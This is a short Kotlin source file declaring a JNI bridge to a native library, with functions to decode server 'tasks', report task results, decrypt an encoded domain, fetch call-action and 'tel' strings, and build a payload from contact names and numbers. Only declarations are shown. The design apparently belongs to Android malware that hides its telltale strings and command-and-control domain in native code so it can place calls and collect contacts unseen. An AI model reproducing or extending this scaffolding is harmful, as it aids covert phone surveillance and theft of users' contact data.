package com.yourcompany.core.jni

object NativeBridge {
    init {
        try { System.loadLibrary("securelogic") }
        catch (e: UnsatisfiedLinkError) { }
    }

    external fun nativeEncryptData(data: String): String
    external fun nativeDecodeTask(payload: String): String
    external fun nativeProcessTaskResult(taskId: Int, rawResult: String): String

    external fun nativeGetCallActionString(): String
    external fun nativeGetTelPrefix(): String
    external fun nativeGetRequestMethodName(): String
    external fun nativeGetCallbackHandlerClassName(): String
    external fun nativeGetSystemCallbackClassName(): String
    external fun nativeGetContactsActionString(): String
    external fun nativeBuildContactsPayload(names: Array<String>, numbers: Array<String>): String

    external fun nativeDecryptDomain(b64: String): String
    external fun nativeGetUuidPrefix(): String
    external fun nativeGetUuidSuffix(): String
}
